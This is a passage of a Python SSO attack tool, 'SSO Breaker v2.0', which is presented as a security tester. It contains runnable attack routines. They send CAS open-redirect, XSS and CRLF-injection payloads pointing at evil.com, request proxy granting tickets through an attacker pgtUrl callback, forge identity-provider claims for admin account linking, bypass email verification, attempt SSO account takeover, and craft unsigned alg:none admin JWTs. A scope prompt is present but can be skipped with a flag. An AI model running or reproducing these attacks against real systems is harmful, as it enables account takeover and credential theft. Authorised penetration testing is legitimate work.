                "Implement one-time-use tickets.", "CAS_TICKET_REUSE")
        return None

    def service_url_manipulation(self) -> Optional[Finding]:
        logger.info("[CAS-URL] Testing service URL open redirect...")
        if not self.config.cas_login_url:
            logger.warning("[CAS-URL] No CAS login URL. Skipping.")
            return None
        evil_urls = [
            "https://evil.com",
            "https://evil.com/fake-login",
            "http://evil.com",
            "https://target.com.evil.com",
            "https://target.com@evil.com",
            "//evil.com",
            "https://evil.com%23target.com",
            "javascript:alert(document.domain)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "https://target.com/../../../evil.com",
            "https://target.com/..;/evil.com",
            "https://evil.com?url=target.com",
            urllib.parse.quote("https://evil.com"),
            "https://target.com\r\nLocation: https://evil.com",
            "https://evil.com#",
            "https://evil.com/path?service=legit",
        ]
        for evil in evil_urls:
            self.sess.rate.wait()
            try:
                resp = self.sess.session.get(
                    self.config.cas_login_url,
                    params={"service": evil},
                    allow_redirects=False, timeout=self.config.timeout)
                logger.info(f"[CAS-URL] service={evil[:35]}... → {resp.status_code}")
                loc = resp.headers.get("Location", "")
                if resp.status_code in (302, 303) and ("evil.com" in loc or evil in loc):
                    return self.sess.add_finding(
                        "CAS Service URL Open Redirect", Severity.HIGH,
                        f"CAS redirects to unvalidated URL: {evil}",
                        f"Location: {loc[:200]}",
                        "Whitelist allowed service URLs.", "CAS_OPEN_REDIRECT")
                if resp.status_code == 200:
                    action_match = re.search(r'action=["\']([^"\']+)["\']', resp.text)
                    if action_match and "evil.com" in action_match.group(1):
                        return self.sess.add_finding(
                            "CAS Service URL Reflected in Login Form", Severity.MEDIUM,
                            f"Evil URL reflected in form action: {action_match.group(1)[:100]}",
                            f"service={evil[:60]}",
                            "Validate and whitelist service URLs.", "CAS_URL_REFLECTION")
            except requests.RequestException as e:
                logger.error(f"[CAS-URL] {e}")
        return None

    def proxy_ticket_abuse(self) -> Optional[Finding]:
        logger.info("[CAS-PROXY] Testing proxy ticket abuse...")
        if not self.config.cas_validate_url:
            logger.warning("[CAS-PROXY] No validate URL. Skipping.")
            return None
        base = self.config.cas_validate_url.rstrip("/")
        proxy_endpoints = set()
        for src in [base]:
            proxy_endpoints.add(re.sub(r'/serviceValidate$', '/proxyValidate', src))
            proxy_endpoints.add(re.sub(r'/validate$', '/proxyValidate', src))
            proxy_endpoints.add(re.sub(r'/p3/serviceValidate$', '/p3/proxyValidate', src))
            proxy_endpoints.add(src.rsplit("/", 1)[0] + "/proxyValidate")
            proxy_endpoints.add(src.rsplit("/", 1)[0] + "/proxy")
        tickets = [
            "PT-" + uuid.uuid4().hex,
            "ST-" + uuid.uuid4().hex,
            "PGT-" + uuid.uuid4().hex,
        ]
        service = self.config.cas_service_url or self.config.target_url
        for endpoint in proxy_endpoints:
            for ticket in tickets:
                self.sess.rate.wait()
                try:
                    resp = self.sess.session.get(
                        endpoint,
                        params={
                            "ticket": ticket,
                            "service": service,
                            "pgtUrl": "https://evil.com/proxy-callback",
                        },
                        timeout=self.config.timeout, allow_redirects=False)
                    logger.info(f"[CAS-PROXY] {endpoint[-35:]} ticket={ticket[:8]}... → {resp.status_code}")
                    if resp.status_code == 200:
                        if "authenticationSuccess" in resp.text or "<cas:user>" in resp.text:
                            return self.sess.add_finding(
                                "CAS Proxy Ticket Validation Bypass", Severity.HIGH,
                                f"Proxy endpoint accepted ticket with evil pgtUrl.",
                                resp.text[:300],
                                "Validate proxy callback URLs. Restrict proxy granting.", "CAS_PROXY")
                        if "proxyGrantingTicket" in resp.text:
                            return self.sess.add_finding(
                                "CAS Proxy Granting Ticket Obtained", Severity.HIGH,
                                "PGT issued to unauthorized callback URL.",
                                resp.text[:300],
                                "Restrict allowed pgtUrl values.", "CAS_PGT_LEAK")
                except requests.RequestException as e:
                    logger.error(f"[CAS-PROXY] {e}")
        return None

    def run_all(self) -> List[Finding]:
        logger.info("=" * 60 + "\n  CAS Attack Suite\n" + "=" * 60)
        attacks = [
            ("Service Ticket Reuse", self.service_ticket_reuse),
            ("Service URL Manipulation", self.service_url_manipulation),
            ("Proxy Ticket Abuse", self.proxy_ticket_abuse),
        ]
        for name, fn in attacks:
            try:
                result = fn()
                if not result:
                    print(f"{Fore.GREEN}[-] {name}: Not vulnerable{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"[{name}] Error: {e}")
        return self.sess.findings


# ---------------------------------------------------------------------------
# General SSO Attacker
# ---------------------------------------------------------------------------
class GeneralSSOAttacker:
    def __init__(self, config: SSOConfig):
        self.config = config
        self.sess = AttackSession(config)

    def _probe_endpoints(self, paths: List[str], method: str, payloads: List[Dict],
                         tag: str, check_fn=None) -> Optional[Tuple[str, Dict, requests.Response]]:
        target = self.config.target_url.rstrip("/")
        for path in paths:
            url = target + path
            for payload in payloads:
                self.sess.rate.wait()
                try:
                    if method == "POST":
                        resp = self.sess.session.post(url, json=payload,
                                                      timeout=self.config.timeout, allow_redirects=False)
                    elif method == "PUT":
                        resp = self.sess.session.put(url, json=payload,
                                                     timeout=self.config.timeout, allow_redirects=False)
                    else:
                        resp = self.sess.session.get(url, params=payload,
                                                     timeout=self.config.timeout, allow_redirects=False)
                    if resp.status_code == 404:
                        break
                    logger.info(f"[{tag}] {method} {path} → {resp.status_code}")
                    if check_fn and check_fn(resp, payload):
                        return (path, payload, resp)
                except requests.RequestException:
                    break
        return None

    def account_linking_abuse(self) -> Optional[Finding]:
        logger.info("[LINK] Testing account linking abuse...")
        paths = [
            "/account/link", "/auth/link", "/sso/link", "/connect/account",
            "/api/account/link", "/api/v1/account/link", "/settings/linked-accounts",
            "/profile/connect", "/oauth/connect", "/auth/connect",
        ]
        payloads = [
            {"provider": "google", "email": "admin@target.com", "provider_id": "evil123"},
            {"provider": "github", "email": "admin@target.com", "external_id": "evil456"},
            {"provider": "saml", "nameID": "admin@target.com", "idp": "https://evil-idp.com"},
            {"provider": "oidc", "sub": "admin", "email": "admin@target.com"},
            {"sso_email": "admin@target.com", "sso_provider": "custom", "link": "true"},
            {"email": "admin@target.com", "provider": "facebook", "token": "fake789"},
        ]

        def check(resp, payload):
            if resp.status_code in (200, 201, 302):
                if "error" not in resp.text.lower()[:300]:
                    session_cookies = [c for c in resp.cookies.keys()
                                      if any(s in c.lower() for s in ["session", "sid", "token"])]
                    if session_cookies or resp.status_code in (200, 201):
                        return True
            return False

        result = self._probe_endpoints(paths, "POST", payloads, "LINK", check)
        if result:
            path, payload, resp = result
            return self.sess.add_finding(
                f"Account Linking Abuse — {path}", Severity.HIGH,
                f"Accepted arbitrary provider claims: {json.dumps(payload, default=str)}",
                f"Status: {resp.status_code}",
                "Require email verification + OAuth token validation before linking.",
                "ACCOUNT_LINKING")
        return None

    def email_verification_bypass(self) -> Optional[Finding]:
        logger.info("[EMAIL-BYP] Testing email verification bypass via SSO...")
        paths = [
            "/auth/sso/callback", "/auth/saml/acs", "/auth/oidc/callback",
            "/sso/callback", "/login/sso", "/api/auth/sso", "/auth/social/callback",
        ]
        payloads = [
            {"email": "admin@target.com", "email_verified": False, "provider": "google", "name": "Evil"},
            {"email": "admin@target.com", "email_verified": "false", "provider": "github"},
            {"email": "admin@target.com", "email_verified": 0, "provider": "facebook"},
            {"email": "admin@target.com", "email_verified": None, "provider": "oidc"},
            {"email": "admin@target.com", "provider": "custom"},
        ]

        def check(resp, payload):
            if resp.status_code in (200, 302):
                session_cookies = [c for c in resp.cookies.keys()
                                  if any(s in c.lower() for s in ["session", "sid", "token", "auth"])]
                if session_cookies:
                    return True
                if resp.status_code == 302:
                    loc = resp.headers.get("Location", "")
                    if loc and "login" not in loc.lower() and "error" not in loc.lower():
                        return True
            return False

        result = self._probe_endpoints(paths, "POST", payloads, "EMAIL-BYP", check)
        if result:
            path, payload, resp = result
            return self.sess.add_finding(
                "Email Verification Bypass via SSO", Severity.CRITICAL,
                f"SSO callback accepted unverified email (email_verified={payload.get('email_verified')}).",
                f"Path: {path}, Status: {resp.status_code}",
                "Always check email_verified claim. Require verification for unverified.",
                "EMAIL_BYPASS")
        return None

    def sso_to_non_sso_takeover(self) -> Optional[Finding]:
        logger.info("[SSO-ATO] Testing SSO to non-SSO account takeover...")
        target = self.config.target_url.rstrip("/")
        test_email = f"sso_test_{uuid.uuid4().hex[:8]}@target.com"
        reg_paths = ["/api/register", "/api/v1/register", "/register", "/signup",
                     "/api/signup", "/auth/register", "/api/users", "/api/v1/users"]
        registered = False
        reg_path_used = ""
        for rp in reg_paths:
            self.sess.rate.wait()
            try:
                resp = self.sess.session.post(
                    target + rp,
                    json={
                        "email": test_email,
                        "password": "TestPassword123!@#",
                        "name": "Test User",
                        "username": f"test_{uuid.uuid4().hex[:6]}",
                    },
                    timeout=self.config.timeout, allow_redirects=False)
                if resp.status_code in (200, 201):
                    registered = True
                    reg_path_used = rp
                    logger.info(f"[SSO-ATO] Registered via {rp}")
                    break
                elif resp.status_code == 404:
                    continue
            except requests.RequestException:
                continue
        if not registered:
            logger.info("[SSO-ATO] No registration endpoint found. Testing SSO callbacks directly.")
        sso_paths = ["/auth/sso/callback", "/sso/callback", "/auth/social/callback",
                     "/auth/oidc/callback", "/auth/saml/acs"]
        sso_payloads = [
            {"email": test_email, "provider": "google", "sub": "evil_sub_" + uuid.uuid4().hex[:6]},
            {"email": test_email, "provider": "saml", "nameID": test_email},
            {"email": test_email, "provider": "github", "id": "evil_id_" + uuid.uuid4().hex[:6]},
        ]

        def check(resp, payload):
            session_cookies = [c for c in resp.cookies.keys()
                              if any(s in c.lower() for s in ["session", "sid", "token", "auth"])]
            if session_cookies:
                return True
            if resp.status_code == 302:
                loc = resp.headers.get("Location", "")
                if "dashboard" in loc.lower() or "home" in loc.lower() or "profile" in loc.lower():
                    return True
            return False

        result = self._probe_endpoints(sso_paths, "POST", sso_payloads, "SSO-ATO", check)
        if result:
            path, payload, resp = result
            return self.sess.add_finding(
                "SSO to Non-SSO Account Takeover", Severity.CRITICAL,
                f"SSO login took over {'registered' if registered else 'existing'} account for {test_email}.",
                f"Registration: {reg_path_used or 'N/A'}, SSO: {path}, Status: {resp.status_code}",
                "Require password confirmation when SSO email matches existing non-SSO account.",
                "SSO_ATO")
        return None

    def provider_confusion(self) -> Optional[Finding]:
        logger.info("[PROV-CONF] Testing provider confusion...")
        paths = ["/auth/callback", "/sso/callback", "/oauth/callback",
                 "/auth/sso", "/login/callback"]
        payloads = [
            {"provider": "google", "code": "fake_code", "state": "valid_state", "idp": "facebook"},
            {"provider": "github", "code": "fake", "redirect_uri": "https://evil.com"},
            {"provider": "custom", "token": self._b64url("alg:none admin token"), "issuer": "https://evil.com"},
            {"provider": "google", "id_token": self._craft_minimal_none_jwt()},
            {"provider": "azure", "code": "stolen_code", "tenant": "common"},
            {"provider": "saml", "SAMLResponse": base64.b64encode(b"<fake/>").decode(), "idp": "oidc"},
        ]

        def check(resp, payload):
            if resp.status_code in (200, 302):
                session_cookies = [c for c in resp.cookies.keys()
                                  if any(s in c.lower() for s in ["session", "sid", "token", "auth"])]
                if session_cookies:
                    return True
                if resp.status_code == 302:
                    loc = resp.headers.get("Location", "")
                    if "error" not in loc.lower() and "login" not in loc.lower() and loc:
                        return True
            return False

        result = self._probe_endpoints(paths, "POST", payloads, "PROV-CONF", check)
        if result:
            path, payload, resp = result
            return self.sess.add_finding(
                f"SSO Provider Confusion", Severity.HIGH,
                f"Application confused SSO providers at {path}: {json.dumps(payload, default=str)[:200]}",
                f"Status: {resp.status_code}",
                "Bind session state to specific IdP. Validate provider identity.",
                "PROVIDER_CONFUSION")
        return None

    @staticmethod
    def _b64url(data: str) -> str:
        return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()

    def _craft_minimal_none_jwt(self) -> str:
        h = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        p = base64.urlsafe_b64encode(json.dumps({
            "sub": "admin", "email": "admin@target.com",
            "iss": "https://evil.com", "exp": int(time.time()) + 3600,
        }).encode()).rstrip(b"=").decode()
        return f"{h}.{p}."

    def run_all(self) -> List[Finding]:
        logger.info("=" * 60 + "\n  General SSO Attack Suite\n" + "=" * 60)
        attacks = [
            ("Account Linking Abuse", self.account_linking_abuse),
            ("Email Verification Bypass", self.email_verification_bypass),
            ("SSO to Non-SSO Takeover", self.sso_to_non_sso_takeover),
            ("Provider Confusion", self.provider_confusion),
        ]
        for name, fn in attacks:
            try:
                result = fn()
                if not result:
                    print(f"{Fore.GREEN}[-] {name}: Not vulnerable{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"[{name}] Error: {e}")
        return self.sess.findings


# ---------------------------------------------------------------------------
# Report generator
# ---------------------------------------------------------------------------
class ReportGenerator:
    @staticmethod
    def text(findings: List[Finding]) -> str:
        if not findings:
            return f"\n{Fore.GREEN}[✓] No vulnerabilities found.{Style.RESET_ALL}\n"
        lines = [
            "", "=" * 70,
            "  SSO SECURITY ASSESSMENT REPORT",
            "=" * 70,
            f"  Date: {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
            f"  Total: {len(findings)}",
        ]
        counts = {}
        for f in findings:
            counts[f.severity.value] = counts.get(f.severity.value, 0) + 1
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if counts.get(sev, 0):
                lines.append(f"  {sev}: {counts[sev]}")
        lines.append("=" * 70)
        for i, f in enumerate(findings, 1):
            lines.append(f"\n─── Finding #{i} ───")
            lines.append(f"  Title:       {f.title}")
            lines.append(f"  Severity:    {f.severity.value}")
            lines.append(f"  Attack:      {f.attack_type}")
            lines.append(f"  Description: {f.description}")
            if f.evidence:
                lines.append(f"  Evidence:    {f.evidence[:500]}")
            if f.remediation:
                lines.append(f"  Fix:         {f.remediation}")
        lines.append("\n" + "=" * 70)
        return "\n".join(lines)

    @staticmethod
    def json_report(findings: List[Finding]) -> str:
        return json.dumps({
            "date": datetime.datetime.utcnow().isoformat(),
            "total": len(findings),
            "findings": [
                {
                    "title": f.title,
                    "severity": f.severity.value,
                    "description": f.description,
                    "evidence": f.evidence,
                    "remediation": f.remediation,
                    "attack_type": f.attack_type,
                }
                for f in findings
            ],
        }, indent=2)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_config(args) -> SSOConfig:
    config = SSOConfig(
        target_url=args.target,
        acs_url=args.acs_url or "",
        sp_entity_id=args.sp_entity_id or "",
        idp_entity_id=args.idp_entity_id or "",
        saml_endpoint=args.saml_endpoint or "",
        saml_metadata_url=args.saml_metadata_url or "",
        oidc_discovery_url=args.oidc_discovery_url or "",
        oidc_auth_endpoint=args.oidc_auth_endpoint or "",
        oidc_token_endpoint=args.oidc_token_endpoint or "",
        oidc_userinfo_endpoint=args.oidc_userinfo_endpoint or "",
        oidc_jwks_uri=args.oidc_jwks_uri or "",
        oidc_client_id=args.oidc_client_id or "",
        oidc_client_secret=args.oidc_client_secret or "",
        oidc_redirect_uri=args.oidc_redirect_uri or "",
        cas_login_url=args.cas_login_url or "",
        cas_validate_url=args.cas_validate_url or "",
        cas_service_url=args.cas_service_url or "",
        saml_response_sample=args.saml_response or "",
        id_token_sample=args.id_token or "",
        proxy=args.proxy or "",
        timeout=args.timeout,
        verify_ssl=not args.no_verify_ssl,
        rate_limit=args.rate_limit,
    )
    if args.cookie:
        for c in args.cookie:
            if "=" in c:
                k, v = c.split("=", 1)
                config.cookies[k.strip()] = v.strip()
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                config.headers[k.strip()] = v.strip()
    return config


def main():
    print(BANNER)
    p = argparse.ArgumentParser(
        description="SSO Breaker v2.0 — Production SSO Security Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SAML with captured response (intercept via Burp, paste base64)
  python sso_breaker.py -t https://app.example.com --module saml \\
      --acs-url https://app.example.com/saml/acs \\
      --saml-response "PHNhbWxwOl..."

  # OIDC with auto-discovery (fetches .well-known + JWKS automatically)
  python sso_breaker.py -t https://app.example.com --module oidc \\
      --oidc-discovery-url https://auth.example.com

  # Full scan with proxy
  python sso_breaker.py -t https://app.example.com --module all \\
      --proxy http://127.0.0.1:8080 -o report.json --format json

  # SAML metadata auto-config
  python sso_breaker.py -t https://app.example.com --module saml \\
      --saml-metadata-url https://idp.example.com/metadata

  # CAS with rate limiting
  python sso_breaker.py -t https://app.example.com --module cas \\
      --cas-login-url https://cas.example.com/login \\
      --cas-validate-url https://cas.example.com/serviceValidate \\
      --rate-limit 1.0
        """)

    p.add_argument("-t", "--target", required=True, help="Target application URL")
    p.add_argument("--module", choices=["saml", "oidc", "cas", "general", "all"],
                   default="all", help="Attack module (default: all)")
    p.add_argument("--skip-scope-check", action="store_true",
                   help="Skip authorization confirmation prompt")

    sg = p.add_argument_group("SAML")
    sg.add_argument("--acs-url", help="Assertion Consumer Service URL")
    sg.add_argument("--sp-entity-id", help="SP Entity ID")
    sg.add_argument("--idp-entity-id", help="IdP Entity ID")
    sg.add_argument("--saml-endpoint", help="SAML SSO endpoint")
    sg.add_argument("--saml-response", help="Base64-encoded captured SAML response")
    sg.add_argument("--saml-metadata-url", help="SAML metadata URL for auto-config")

    og = p.add_argument_group("OIDC")
    og.add_argument("--oidc-discovery-url", help="OIDC issuer URL for .well-known discovery")
    og.add_argument("--oidc-auth-endpoint", help="Authorization endpoint")
    og.add_argument("--oidc-token-endpoint", help="Token endpoint")
    og.add_argument("--oidc-userinfo-endpoint", help="UserInfo endpoint")
    og.add_argument("--oidc-jwks-uri", help="JWKS URI (auto-discovered if not set)")
    og.add_argument("--oidc-client-id", help="Client ID")
    og.add_argument("--oidc-client-secret", help="Client secret")
    og.add_argument("--oidc-redirect-uri", help="Redirect URI")
    og.add_argument("--id-token", help="Captured JWT ID token")

    cg = p.add_argument_group("CAS")
    cg.add_argument("--cas-login-url", help="CAS login URL")
    cg.add_argument("--cas-validate-url", help="CAS validation URL")
    cg.add_argument("--cas-service-url", help="CAS service URL")

    gg = p.add_argument_group("General")
    gg.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    gg.add_argument("--timeout", type=int, default=30, help="Request timeout (default: 30)")
    gg.add_argument("--rate-limit", type=float, default=0.5,
                    help="Min seconds between requests (default: 0.5)")
    gg.add_argument("--no-verify-ssl", action="store_true", help="Disable SSL verification")
    gg.add_argument("-c", "--cookie", action="append", help="Cookie name=value (repeatable)")
    gg.add_argument("-H", "--header", action="append", help="Header Name: Value (repeatable)")
    gg.add_argument("-o", "--output", help="Output file path")
    gg.add_argument("--format", choices=["text", "json"], default="text", help="Report format")
    gg.add_argument("-v", "--verbose", action="store_true", help="Debug logging")

    args = p.parse_args()
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    config = build_config(args)

    # Scope validation
    if not args.skip_scope_check:
        if not ScopeValidator.validate(config):
            print(f"\n{Fore.RED}[!] Scope not confirmed. Exiting.{Style.RESET_ALL}")
            sys.exit(1)

    # Auto-configure from SAML metadata
    if config.saml_metadata_url:
        print(f"\n{Fore.CYAN}[*] Fetching SAML metadata...{Style.RESET_ALL}")
        tmp_session = requests.Session()
        tmp_session.verify = config.verify_ssl
        if config.proxy:
            tmp_session.proxies = {"http": config.proxy, "https": config.proxy}
        parser = SAMLMetadataParser(tmp_session, config.timeout)
        md = parser.fetch_and_parse(config.saml_metadata_url)
        if md.get("entity_id") and not config.idp_entity_id:
            config.idp_entity_id = md["entity_id"]
            print(f"  IdP Entity ID: {config.idp_entity_id}")
        if md.get("acs_url") and not config.acs_url:
            config.acs_url = md["acs_url"]
            print(f"  ACS URL: {config.acs_url}")
        if md.get("sso_url") and not config.saml_endpoint:
            config.saml_endpoint = md["sso_url"]
            print(f"  SSO URL: {config.saml_endpoint}")

    all_findings: List[Finding] = []

    if args.module in ("saml", "all"):
        print(f"\n{Fore.CYAN}{'━' * 50}")
        print(f"  SAML Attack Module")
        print(f"{'━' * 50}{Style.RESET_ALL}")
        attacker = SAMLAttacker(config)
        all_findings.extend(attacker.run_all())

    if args.module in ("oidc", "all"):
        print(f"\n{Fore.CYAN}{'━' * 50}")
        print(f"  OIDC Attack Module")
        print(f"{'━' * 50}{Style.RESET_ALL}")
        attacker = OIDCAttacker(config)
        all_findings.extend(attacker.run_all())

    if args.module in ("cas", "all"):
        print(f"\n{Fore.CYAN}{'━' * 50}")
        print(f"  CAS Attack Module")
        print(f"{'━' * 50}{Style.RESET_ALL}")
        attacker = CASAttacker(config)
        all_findings.extend(attacker.run_all())

    if args.module in ("general", "all"):
        print(f"\n{Fore.CYAN}{'━' * 50}")
        print(f"  General SSO Attack Module")
        print(f"{'━' * 50}{Style.RESET_ALL}")
        attacker = GeneralSSOAttacker(config)
        all_findings.extend(attacker.run_all())

    # Report
    rg = ReportGenerator()
    if args.format == "json":
        report = rg.json_report(all_findings)
    else:
        report = rg.text(all_findings)
    print(report)

    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(report)
            print(f"\n{Fore.GREEN}[+] Report saved: {args.output}{Style.RESET_ALL}")
        except IOError as e:
            print(f"\n{Fore.RED}[!] Save failed: {e}{Style.RESET_ALL}")

    # Summary
    crit = sum(1 for f in all_findings if f.severity == Severity.CRITICAL)
    high = sum(1 for f in all_findings if f.severity == Severity.HIGH)
    med = sum(1 for f in all_findings if f.severity == Severity.MEDIUM)
    print(f"\n{Fore.CYAN}{'━' * 50}")
    print(f"  Scan Complete — {len(all_findings)} findings")
    if crit:
        print(f"  {Fore.RED}CRITICAL: {crit}{Fore.CYAN}")
    if high:
        print(f"  {Fore.YELLOW}HIGH:     {high}{Fore.CYAN}")
    if med:
        print(f"  MEDIUM:   {med}")
    print(f"{'━' * 50}{Style.RESET_ALL}\n")

    sys.exit(1 if all_findings else 0)


if __name__ == "__main__":
    main()
